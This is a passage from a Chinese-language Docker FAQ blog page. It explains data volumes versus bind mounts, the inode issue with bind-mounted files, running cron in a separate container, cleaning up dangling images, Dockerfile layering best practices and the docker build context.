Container）弄混。数据卷是 Docker 引擎维护的存储方式，使用 <code>docker volume create</code> 命令创建，可以利用卷驱动支持多种存储方案。其默认的驱动为 <code>local</code>，也就是本地卷驱动。本地驱动支持命名卷和匿名卷。</p><p>顾名思义，命名卷就是有名字的卷，使用 <code>docker volume create --name xxx</code> 形式创建并命名的卷；而匿名卷就是没名字的卷，一般是 <code>docker run -v /data</code>这种不指定卷名的时候所产生，或者 Dockerfile 里面的定义直接使用的。</p><p>有名字的卷，在用过一次后，以后挂载容器的时候还可以使用，因为有名字可以指定。所以一般需要保存的数据使用命名卷保存。</p><p>而匿名卷则是随着容器建立而建立，随着容器消亡而淹没于卷列表中（对于 docker run 匿名卷不会被自动删除）。对于二代 Swarm 服务而言，匿名卷会随着服务删除而自动删除。 因此匿名卷只存放无关紧要的临时数据，随着容器消亡，这些数据将失去存在的意义。</p><p>此外，还有一个叫数据容器 (Data Container) 的概念，也就是使用<code>--volumes-from</code>的东西。这早就不用了，如果看了书还在说这种方式，那说明书已经过时了。按照今天的理解，这类数据容器，无非就是挂了个匿名卷的容器罢了。</p><p>在 <code>Dockerfile</code> 中定义的挂载，是指 <code>匿名数据卷</code>。<code>Dockerfile</code> 中指定 <code>VOLUME</code> 的目的，只是为了将某个路径确定为卷。</p><p>我们知道，按照最佳实践的要求，不应该在容器存储层内进行数据写入操作，所有写入应该使用卷。如果定制镜像的时候，就可以确定某些目录会发生频繁大量的读写操作，那么为了避免在运行时由于用户疏忽而忘记指定卷，导致容器发生存储层写入的问题，就可以在 <code>Dockerfile</code> 中使用<code>VOLUME</code>来指定某些目录为匿名卷。这样即使用户忘记了指定卷，也不会产生不良的后果。</p><p>这个设置可以在运行时覆盖。通过 <code>docker run</code> 的 <code>-v</code>参数或者 <code>docker-compose.yml</code> 的 <code>volumes</code> 指定。使用命名卷的好处是可以复用，其它容器可以通过这个命名数据卷的名字来指定挂载，共享其内容（不过要注意并发访问的竞争问题）。</p><p>比如，<code>Dockerfile</code> 中说 <code>VOLUME /data</code>，那么如果直接 <code>docker run</code>，其 <code>/data</code> 就会被挂载为匿名卷，向 <code>/data</code>写入的操作不会写入到容器存储层，而是写入到了匿名卷中。但是如果运行时 <code>docker run -v mydata:/data</code>，这就覆盖了 <code>/data</code> 的挂载设置，要求将 <code>/data</code> 挂载到名为 <code>mydata</code> 的命名卷中。所以说 <code>Dockerfile</code> 中的 <code>VOLUME</code> 实际上是一层保险，确保镜像运行可以更好的遵循最佳实践，不向容器存储层内进行写入操作。</p><p>数据卷默认可能会保存于<code>/var/lib/docker/volumes</code>，不过一般不需要、也不应该访问这个位置。</p><h2 id="问：卷和挂载目录有什么区别？"><a href="#问：卷和挂载目录有什么区别？" class="headerlink" title="问：卷和挂载目录有什么区别？"></a>问：卷和挂载目录有什么区别？</h2><p><strong>答：</strong> <code>卷 (Docker Volume)</code> 是受控存储，是由 <code>Docker</code> 引擎进行管理维护的。因此使用卷，你可以不必处理 <code>uid</code>、<code>SELinux</code> 等各种权限问题，Docker 引擎在建立卷时会自动添加安全规则，以及根据挂载点调整权限。并且可以统一列表、添加、删除。另外，除了本地卷外，还支持网络卷、分布式卷。</p><p>而挂载目录那就没人管了，属于用户自行维护。你就必须手动处理所有权限问题。特别是在 <code>CentOS</code> 上，很多人碰到 <code>Permission Denied</code>，就是因为没有使用卷，而是挂载目录，而且还对 <code>SELinux</code> 安全权限一无所知导致。</p><h2 id="问：为什么绑定了宿主的文件到容器，宿主修改了文件，容器内看到的还是旧的内容啊？"><a href="#问：为什么绑定了宿主的文件到容器，宿主修改了文件，容器内看到的还是旧的内容啊？" class="headerlink" title="问：为什么绑定了宿主的文件到容器，宿主修改了文件，容器内看到的还是旧的内容啊？"></a>问：为什么绑定了宿主的文件到容器，宿主修改了文件，容器内看到的还是旧的内容啊？</h2><p><strong>答：</strong> 在绑定宿主内容的形式中，有一种特殊的形式，就是绑定宿主文件，既：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -v <span class="variable">$PWD</span>/myapp.ini:/app/app.ini myapp</span><br></pre></td></tr></table></figure><p>在 <code>myapp.ini</code> 文件不发生改变的情况下，这样的绑定是和绑定宿主目录性质一样，同样是将宿主文件绑定到容器内部，容器内可以看到这个文件。但是，一旦文件发生改变，情况则有不同。</p><p>简单的文件修改，比如 <code>echo &quot;name = jessie&quot; &gt;&gt; myapp.ini</code>，这类修改依旧还是原来的文件，宿主（或容器）对文件进行的改动，另一方是可以看到的。</p><p>而复杂的文件操作，比如使用 <code>vim</code>，或者其它编辑器编辑文件，则很有可能会导致一方的修改，另一方看不到。</p><p>其原因是这类编辑器在保存文件的时候，经常会采用一种避免写入过程中发生故障而导致文件丢失的策略，既先把内容写到一个新的文件中去，写好了后，再删除旧的文件，然后把新文件改名为旧的文件名，从而完成保存的操作。从这个操作流程可以看出，虽然修改后的文件的名字和过去一样，但对于文件系统而言是一个新的文件了。换句话说，虽然是同名文件，但是旧的文件的 <code>inode</code> 和修改后的文件的 <code>inode</code> 不同。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -i</span><br><span class="line">268541 hello.txt</span><br><span class="line">$ vi hello.txt</span><br><span class="line">$ ls -i</span><br><span class="line">268716 hello.txt</span><br></pre></td></tr></table></figure><p>如上面的例子可以看到，经过 <code>vim</code> 编辑文件后，<code>inode</code> 从 <code>268541</code> 变为了 <code>268716</code>，这就是刚才说的，名字还是那个名字，文件已不是原来的文件了。</p><p>而 Docker 的 绑定宿主文件，实际上在文件系统眼里，针对的是 <code>inode</code>，而不是文件名。因此容器内所看到的，依旧是之前旧的 <code>inode</code> 对应的那个文件，也就是旧的内容。</p><p>这就出现了之前的那个问题，在宿主内修改绑定文件的内容，结果发现容器内看不到改变，其原因就在于宿主的那个文件已不是原来的文件了。</p><p>这类问题解决办法很简单，如果文件可能改变，那么就不要绑定宿主文件，而是绑定一个宿主目录，这样只要目录不跑，里面文件爱咋改就咋改。</p><h2 id="问：多个-Docker-容器之间共享数据怎么办？"><a href="#问：多个-Docker-容器之间共享数据怎么办？" class="headerlink" title="问：多个 Docker 容器之间共享数据怎么办？"></a>问：多个 Docker 容器之间共享数据怎么办？</h2><p><strong>答：</strong> 如果是不同宿主，则可以使用分布式数据卷驱动，让分布在不同宿主的容器都可以访问到的分布式存储的位置。如S3之类：</p><ul><li><a href="https://docs.docker.com/engine/extend/legacy_plugins/#authorization-plugins" target="_blank" rel="noopener">https://docs.docker.com/engine/extend/legacy_plugins/#authorization-plugins</a></li></ul><h2 id="问：既然一个容器一个应用，那么我想在该容器中用计划任务-cron-怎么办？"><a href="#问：既然一个容器一个应用，那么我想在该容器中用计划任务-cron-怎么办？" class="headerlink" title="问：既然一个容器一个应用，那么我想在该容器中用计划任务 cron 怎么办？"></a>问：既然一个容器一个应用，那么我想在该容器中用计划任务 cron 怎么办？</h2><p><strong>答：</strong> <code>cron</code> 其实是另一个服务了，所以应该另起一个容器来进行，如需访问该应用的数据文件，那么可以共享该应用的数据卷即可。而 <code>cron</code> 的容器中，<code>cron</code> 以前台运行即可。</p><p>比如，我们希望有个 <code>python</code> 脚本可以定时执行。那么可以这样构建这个容器。</p><p>首先基于 <code>python</code> 的镜像定制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.5.2</span><br><span class="line">ENV TZ=Asia/Shanghai</span><br><span class="line">RUN apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y cron \</span><br><span class="line">    &amp;&amp; apt-get autoremove -y</span><br><span class="line">COPY ./cronpy /etc/cron.d/cronpy</span><br><span class="line">CMD [<span class="string">"cron"</span>, <span class="string">"-f"</span>]</span><br></pre></td></tr></table></figure><p>中所提及的 <code>cronpy</code> 就是我们需要计划执行的 <code>cron</code> 脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root /app/task.py &gt;&gt; /var/<span class="built_in">log</span>/task.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在这个计划中，我们希望定时执行 <code>/app/task.py</code> 文件，日志记录在<code>/var/log/task.log</code> 中。这个 <code>task.py</code> 是一个非常简单的文件，其内容只是输出个时间而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Cron job has run at &#123;0&#125; with environment variable "</span>.format(str(datetime.now())))</span><br></pre></td></tr></table></figure><p>这 <code>task.py</code> 可以在构建镜像时放进去，也可以挂载宿主目录。在这里，我以挂载宿主目录举例。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建镜像</span></span><br><span class="line">docker build -t cronjob:latest .</span><br><span class="line"><span class="comment"># 运行镜像</span></span><br><span class="line">docker run \</span><br><span class="line">    --name cronjob \</span><br><span class="line">    -d \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>)/task.py:/app/task.py \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>)/<span class="built_in">log</span>/:/var/<span class="built_in">log</span>/ \</span><br><span class="line">    cronjob:latest</span><br></pre></td></tr></table></figure><p>需要注意的是，应该在构建主机上赋予 <code>task.py</code> 文件可执行权限。</p><h2 id="问：为什么说数据库不适合放在-Docker-容器里运行？"><a href="#问：为什么说数据库不适合放在-Docker-容器里运行？" class="headerlink" title="问：为什么说数据库不适合放在 Docker 容器里运行？"></a>问：为什么说数据库不适合放在 Docker 容器里运行？</h2><p><strong>答：</strong> 不为什么，因为这个说法不对，大部分认为数据库必须放到容器外运行的人根本不知道 <code>Docker Volume</code> 为何物。</p><p>在早年 Docker 没有 <code>Docker Volume</code> 的时候，其数据持久化是一个问题，但是这已经很多年过去了。现在有 <code>Docker Volume</code>解决持久化问题，从本地目录绑定、受控存储空间、块设备、网络存储到分布式存储，<code>Docker Volume</code> 都支持，不存在数据读写类的服务不适于运行于容器内的说法。</p><p>Docker 不是虚拟机，使用数据卷是直接向宿主写入文件，不存在性能损耗。而且卷的生存周期独立于容器，容器消亡卷不消亡，重新运行容器可以挂载指定命名卷，数据依然存在，也不存在无法持久化的问题。</p><p>建议去阅读一下官方文档：</p><ul><li><a href="https://docs.docker.com/engine/tutorials/dockervolumes/" target="_blank" rel="noopener">https://docs.docker.com/engine/tutorials/dockervolumes/</a></li><li><a href="https://docs.docker.com/engine/reference/commandline/volume_create/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/volume_create/</a></li><li><a href="https://docs.docker.com/engine/extend/legacy_plugins/#/volume-plugins" target="_blank" rel="noopener">https://docs.docker.com/engine/extend/legacy_plugins/#/volume-plugins</a></li></ul><h2 id="问：如何列出容器和所使用的卷的关系？"><a href="#问：如何列出容器和所使用的卷的关系？" class="headerlink" title="问：如何列出容器和所使用的卷的关系？"></a>问：如何列出容器和所使用的卷的关系？</h2><p><strong>答：</strong> 要感谢强大的 <code>Go Template</code>，可以使用下面的命令来显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect --format <span class="string">'&#123;&#123;.Name&#125;&#125; =&gt; &#123;&#123;with .Mounts&#125;&#125;&#123;&#123;range .&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;.Name&#125;&#125;,&#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;'</span> $(docker ps -aq)</span><br></pre></td></tr></table></figure><p><strong>注意这里的换行和空格是有意如此的</strong>，这样就可以再返回结果控制缩进格式。其结果将是如下形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ docker inspect --format <span class="string">'&#123;&#123;.Name&#125;&#125; =&gt; &#123;&#123;with .Mounts&#125;&#125;&#123;&#123;range .&#125;&#125;</span></span><br><span class="line"><span class="string">    &#123;&#123;.Name&#125;&#125;&#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;'</span> $(docker ps -aq)</span><br><span class="line">/device_api_1 =&gt;</span><br><span class="line">/device_dashboard-debug_1 =&gt;</span><br><span class="line">/device_redis_1 =&gt;</span><br><span class="line">    device_redis-data</span><br><span class="line">/device_mongo_1 =&gt;</span><br><span class="line">    device_mongo-data</span><br><span class="line">    61453e46c3409f42e938324d7feffc6aeb6b7ce16d2080566e3b128c910c9570</span><br><span class="line">/prometheus_prometheus_1 =&gt;</span><br><span class="line">    fc0185ed3fc637295de810efaff7333e8ff2f6050d7f9368a22e19fb2c1e3c3f</span><br></pre></td></tr></table></figure><h2 id="问：docker-pull-下来的镜像文件都在哪？"><a href="#问：docker-pull-下来的镜像文件都在哪？" class="headerlink" title="问：docker pull 下来的镜像文件都在哪？"></a>问：docker pull 下来的镜像文件都在哪？</h2><p><strong>答：</strong>  Docker不是虚拟机，Docker 镜像也不是虚拟机的 ISO 文件。Docker 的镜像是分层存储，每一个镜像都是由很多层，很多个文件组成。而不同的镜像是共享相同的层的，所以这是一个树形结构，不存在具体哪个文件是 <code>pull</code> 下来的镜像的问题。</p><h2 id="问：docker-images-命令显示的镜像占了好大的空间，怎么办？"><a href="#问：docker-images-命令显示的镜像占了好大的空间，怎么办？" class="headerlink" title="问：docker images 命令显示的镜像占了好大的空间，怎么办？"></a>问：docker images 命令显示的镜像占了好大的空间，怎么办？</h2><p><strong>答：</strong> 这个显示的大小是计算后的大小，要知道 <code>docker image</code> 是分层存储的，在<code>1.10</code>之前，不同镜像无法共享同一层，所以基本上确实是下载大小。但是从<code>1.10</code>之后，已有的层（通过SHA256来判断），不需要再下载。只需要下载变化的层。所以实际下载大小比这个数值要小。而且本地硬盘空间占用，也比d<code>ocker images</code>列出来的东西加起来小很多，很多重复的部分共享了。<br>用以下命令可以清理旧的和未使用的Docker镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker image prune  [OPTIONS] <span class="comment">#命令用于删除未使用的映像。 如果指定了-a，还将删除任何容器未引用的所有映像。</span></span><br><span class="line"></span><br><span class="line">名称，简写默认说明</span><br><span class="line">--all, -a<span class="literal">false</span>显示所有映像(默认隐藏中间映像)</span><br><span class="line">--force, -f<span class="literal">false</span>不要提示确认</span><br></pre></td></tr></table></figure><h2 id="问：docker-images-a-后显示了好多-的镜像？都是什么呀？能删么？"><a href="#问：docker-images-a-后显示了好多-的镜像？都是什么呀？能删么？" class="headerlink" title="问：docker images -a 后显示了好多  的镜像？都是什么呀？能删么？"></a>问：docker images -a 后显示了好多 <none> 的镜像？都是什么呀？能删么？</none></h2><p><strong>答：</strong>  简单来说，<code>&lt;none&gt;</code> 就是说该镜像没有打标签。而没有打标签镜像一般分为两类，一类是依赖镜像，一类是丢了标签的镜像。</p><p><strong>依赖镜像</strong></p><p>Docker的镜像、容器的存储层是<code>Union FS</code>，分层存储结构。所以任何镜像除了最上面一层打上标签(tag)外，其它下面依赖的一层层存储也是存在的。这些镜像没有打上任何标签，所以在 <code>docker images -a</code> 的时候会以 <code>&lt;none&gt;</code> 的形式显示。注意观察一下 <code>docker pull</code>的每一层的<code>sha256</code>的校验值，然后对比一下<code>&lt;none&gt;</code> 中的相同校验值的镜像，它们就是依赖镜像。这些镜像不应当被删除，因为有标签镜像在依赖它们。</p><p><strong>丢了标签的镜像</strong></p><p>这类镜像可能本来有标签，后来丢了。原因可能很多，比如：</p><ul><li><code>docker pull</code> 了一个同样标签但是新版本的镜像，于是该标签从旧版本的镜像转移到了新版本镜像上，那么旧版本的镜像上的标签就丢了；</li><li><code>docker build</code> 时指定的标签都是一样的，那么新构建的镜像拥有该标签，而之前构建的镜像就丢失了标签。</li></ul><p>这类镜像被称为 <code>dangling</code> 虚悬镜像。这些镜像可以删除，手动删除 <code>dangling</code> 镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -aq -f <span class="string">"dangling=true"</span>)</span><br></pre></td></tr></table></figure><h2 id="问：为什么说不要使用-import-export-save-load-commit-来构建镜像？"><a href="#问：为什么说不要使用-import-export-save-load-commit-来构建镜像？" class="headerlink" title="问：为什么说不要使用 import, export, save, load, commit 来构建镜像？"></a>问：为什么说不要使用 import, export, save, load, commit 来构建镜像？</h2><p><strong>答：</strong> Docker 提供了很好的 <code>Dockerfile</code> 的机制来帮助定制镜像，可以直接使用<code>Shell</code>命令，非常方便。而且，这样制作的镜像更加透明，也容易维护，在基础镜像升级后，可以简单地重新构建一下，就可以继承基础镜像的安全维护操作。</p><p>使用 <code>docker commit</code> 制作的镜像被称为<code>黑箱镜像</code>，换句话说，就是里面进行的是黑箱操作，除本人外无人知晓。即使这个制作镜像的人，过一段时间后也不会完整的记起里面的操作。那么当有些东西需要改变时，或者因基础镜像更新而需要重新制作镜像时，会让一切变得异常困难，就如同重新安装调试配置服务器一样，失去了 Docker 的优势了。</p><p>另外，Docker 不是虚拟机，其文件系统是 <code>Union FS</code>，分层式存储，每一次 <code>commit</code> 都会建立一层，上一层的文件并不会因为 <code>rm</code>而删除，只是在当前层标记为删除而看不到了而已，每次 <code>docker pull</code> 的时候，那些不必要的文件都会如影随形，所得到的镜像也必然臃肿不堪。而且，随着文件层数的增加，不仅仅镜像更臃肿，其运行时性能也必然会受到影响。这一切都违背了 Docker 的最佳实践。</p><p>使用 <code>commit</code> 的场合是一些特殊环境，比如入侵后保存现场等等，这个命令不应该成为定制镜像的标准做法。所以，请用 <code>Dockerfile</code> 定制镜像。</p><p><code>import</code> 和 <code>export</code> 的做法，实际上是将一个容器来保存为 <code>tar</code> 文件，然后在导入为镜像。这样制作的镜像同样是黑箱镜像，不应该使用。而且这类导入导出会导致原有分层丢失，合并为一层，而且会丢失很多相关镜像元数据或者配置，比如 <code>CMD</code> 命令就可能丢失，导致镜像无法直接启动。</p><p><code>save</code> 和 <code>load</code> 确实是镜像保存和加载，但是这是在没有 <code>registry</code> 的情况下，手动把镜像考来考去，这是回到了十多年的 U 盘时代。这同样是不推荐的，镜像的发布、更新维护应该使用 <code>registry</code>。无论是自己架设私有 <code>registry</code> 服务，还是使用公有 <code>registry</code> 服务，如 <code>Docker Hub</code>。</p><h2 id="问：Dockerfile-怎么写？"><a href="#问：Dockerfile-怎么写？" class="headerlink" title="问：Dockerfile 怎么写？"></a>问：Dockerfile 怎么写？</h2><p><strong>答：</strong> 最直接也是最简单的办法是看官方文档。</p><p>这篇文章讲述具体 Dockerfile 的命令语法：</p><ul><li><a href="https://docs.docker.com/engine/reference/builder/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/builder/</a></li></ul><p>然后，学习一下官方的 Dockerfile 最佳实践：</p><ul><li><a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/" target="_blank" rel="noopener">https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/</a></li></ul><p>最后，去 <code>Docker Hub</code> 学习那些<code>官方(Official)镜像</code> <code>Dockerfile</code> 咋写的。</p><p><code>Dockerfile</code> 不等于 <code>.sh</code> 脚本,<code>Dockerfile</code> 确实是描述如何构建镜像的，其中也提供了<code>RUN</code>这样的命令，可以运行 <code>shell</code>命令。但是和普通 <code>shell</code> 脚本还有很大的不同。</p><p><code>Dockerfile</code> 描述的实际上是镜像的每一层要如何构建，所以每一个<code>RUN</code>是一个独立的一层。所以一定要理解“分层存储”的概念。上一层的东西不会被物理删除，而是会保留给下一层，下一层中可以指定删除这部分内容，但实际上只是这一层做的某个标记，说这个路径的东西删了。但实际上并不会去修改上一层的东西。每一层都是静态的，这也是容器本身的<code>immutable</code> 特性，要保持自身的静态特性。</p><p>所以很多新手会常犯下面这样的错误，把 <code>Dockerfile</code> 当做 <code>shell</code> 脚本来写了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RUN yum update</span><br><span class="line">RUN yum -y install gcc</span><br><span class="line">RUN yum -y install python</span><br><span class="line">ADD jdk-xxxx.tar.gz /tmp</span><br><span class="line">RUN <span class="built_in">cd</span> xxxx &amp;&amp; install</span><br><span class="line">RUN xxx &amp;&amp; configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>这是相当错误的。除了无畏的增加了很多层，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。</p><p>正确的写法应该是把同一个任务的命令放到一个 <code>RUN</code> 下，多条命令应该用<code>&amp;&amp;</code> 连接，并且在最后要打扫干净所使用的环境。比如下面这段摘自官方 <code>redis</code> 镜像 <code>Dockerfile</code>的部分：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RUN buildDeps=<span class="string">'gcc libc6-dev make'</span> \</span><br><span class="line">    &amp;&amp; <span class="built_in">set</span> -x \</span><br><span class="line">    &amp;&amp; apt-get update &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> --no-install-recommends \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz <span class="string">"<span class="variable">$REDIS_DOWNLOAD_URL</span>"</span> \</span><br><span class="line">    &amp;&amp; <span class="built_in">echo</span> <span class="string">"<span class="variable">$REDIS_DOWNLOAD_SHA1</span> *redis.tar.gz"</span> | sha1sum -c - \</span><br><span class="line">    &amp;&amp; mkdir -p /usr/src/redis \</span><br><span class="line">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \</span><br><span class="line">    &amp;&amp; rm redis.tar.gz \</span><br><span class="line">    &amp;&amp; make -C /usr/src/redis \</span><br><span class="line">    &amp;&amp; make -C /usr/src/redis install \</span><br><span class="line">    &amp;&amp; rm -r /usr/src/redis \</span><br><span class="line">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span><br></pre></td></tr></table></figure><p>但也不能绝对的说把所有命令都合并到一个 RUN 就对，不是把所有命令都合为一个 RUN，要合理分层，以加快构建和部署。</p><p><strong>合理分层就是将具有不同变更频繁程度的层，进行拆分，让稳定的部分在基础，更容易变更的部分在表层，使得资源可以重复利用，以增加构建和部署的速度。</strong></p><p>以 node.js 的应用示例镜像为例，其中的复制应用和安装依赖的部分，如果都合并一起，会写成这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY . /usr/src/app</span><br><span class="line">RUN npm install</span><br></pre></td></tr></table></figure><p>但是，在 <code>node.js</code> 应用镜像示例中，则是这么写的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COPY package.json /usr/src/app/</span><br><span class="line">RUN npm install</span><br><span class="line">COPY . /usr/src/app</span><br></pre></td></tr></table></figure><p>从层数上看，确实多了一层。但实际上，这三行分开是故意这样做的，其目的就是合理分层，充分利用 <code>Docker</code> 分层存储的概念，以增加构建、部署的效率。</p><p>在 <code>docker build</code> 的构建过程中，如果某层之前构建过，而且该层未发生改变的情况下，那么 docker 就会直接使用缓存，不会重复构建。因此，合理分层，充分利用缓存，会显著加速构建速度。</p><p>第一行的目的是将 <code>package.json</code> 复制到应用目录，而不是整个应用代码目录。这样只有 <code>pakcage.json</code> 发生改变后，才会触发第二行 <code>RUN npm install</code>。而只要 <code>package.json</code>没有变化，那么应用的代码改变就不会引发 <code>npm install</code>，只会引发第三行的 <code>COPY . /usr/src/app</code>，从而加快构建速度。</p><p>而如果按照前面所提到的，合并为两层，那么任何代码改变，都会触发 <code>RUN npm install</code>，从而浪费大量的带宽和时间。</p><p>合理分层除了可以加快构建外，还可以加快部署，要知道，<code>docker pull</code> 的时候，是分层下载的，并且已存在的层就不会重复下载。</p><p>比如，这里的 <code>RUN npm install</code> 这一层，往往会几百 <code>MB</code> 甚至上 <code>GB</code>。而在 <code>package.json</code> 未发生变更的情况下，那么只有 <code>COPY . /usr/src/app</code> 这一层会被重新构建，并且也只有这一层会在各个节点 <code>docker pull</code> 的过程中重新下载，往往这一层的代码量只有几十 <code>MB</code>，甚至更小。这对于大规模的并行部署中，所节约的东西向流量是非常显著的。特别是敏捷开发环境中，代码变更的频繁度要比依赖变更的频繁度高很多，每次重复下载依赖，会导致不必要的流量和时间上的浪费。</p><h2 id="问：context-到底是一个什么概念？"><a href="#问：context-到底是一个什么概念？" class="headerlink" title="问：context 到底是一个什么概念？"></a>问：context 到底是一个什么概念？</h2><p><strong>答：</strong> <code>context</code>，上下文，是 <code>docker build</code> 中很重要的一个概念。构建镜像必须指定 <code>context</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t xxx &lt;context路径&gt;</span><br></pre></td></tr></table></figure><p>或者 <code>docker-compose.yml</code> 中的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app:</span><br><span class="line">    build:</span><br><span class="line">        context: &lt;context路径&gt;</span><br><span class="line">        dockerfile: dockerfile</span><br></pre></td></tr></table></figure><p>这里都需要指定 <code>context</code>。<br><code>context</code> 是工作目录，但不要和构建镜像的<code>Dockerfile</code> 中的<code>WORKDIR</code>弄混，<code>context</code> 是 <code>docker build</code>命令的工作目录。</p><p><code>docker build</code> 命令实际上是客户端，真正构建镜像并非由该命令直接完成。<code>docker build</code> 命令将 <code>context</code> 的目录上传给 <code>Docker</code> 引擎，由它负责制作镜像。</p><p>在 <code>Dockerfile</code> 中如果写 <code>COPY ./package.json /app/</code>这种命令，实际的意思并不是指执行 <code>docker build</code> 所在的目录下的 <code>package.json</code>，也不是指 Dockerfile 所在目录下的<code>package.json</code>，而是指 <code>context</code> 目录下的 <code>package.json</code>。</p><p>这就是为什么有人发现 <code>COPY ../package.json /app</code> 或者 <code>COPY /opt/xxxx /app</code>无法工作的原因，因为它们都在 <code>context</code> 之外，如果真正需要，应该将它们复制到 <code>context</code>目录下再操作。</p><p>话说，有一些网文甚至搞笑的说要把 <code>Dockerfile</code>放到磁盘根目录，才能构建如何如何。这都是对 <code>context</code> 完全不了解的表现。想象一下把整个磁盘几十个 <code>GB</code>当做上下文发送给 <code>dockerd</code> 引擎的情况。</p><p><code>docker build -t xxx .</code> 中的这个<code>.</code>，实际上就是在指定 <code>Context</code> 的目录，而并非是指定 <code>Dockerfile</code> 所在目录。</p><p>默认情况下，如果不额外指定 <code>Dockerfile</code> 的话，会将 <code>Context</code> 下的名为 <code>Dockerfile</code> 的文件作为 <code>Dockerfile</code>。所以很多人会混淆，认为这个<code>.</code> 是在说 <code>Dockerfile</code> 的位置，其实不然。</p><p>一般项目中，<code>Dockerfile</code> 可能被放置于两个位置。</p><ul><li>一个可能是放置于项目顶级目录，这样的好处是在顶级目录构建时，项目所有内容都在上下文内，方便构建；</li><li>另一个做法是，将所有 Docker 相关的内容集中于某个目录，比如 <code>docker</code> 目录，里面包含所有不同分支的<code>Dockerfile</code>，以及 <code>docker-compose.yml</code>类的文件、<code>entrypoint</code>的脚本等等。这种情况的上下文所在目录不再是 <code>Dockerfile</code> 所在目录了，因此需要注意指定上下文的位置。</li></ul><p>此外，项目中可能会包含一些构建不需要的文件，这些文件不应该被发送给 <code>dockerd</code> 引擎，但是它们处于上下文目录下，这种情况，我们需要使用 <code>.dockerignore</code>文件来过滤不必要的内容。<code>.dockerignore</code> 文件应该放置于上下文顶级目录下，内容格式和 <code>.gitignore</code> 一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tmp</span><br><span class="line">db</span><br></pre></td></tr></table></figure><p>这样就过滤了 <code>tmp</code> 和<code>db</code>目录，它们不会被作为上下文的一部分发给 <code>dockerd</code>引擎。</p><h2 id="问：ENTRYPOINT-和-CMD-到底有什么不同？"><a 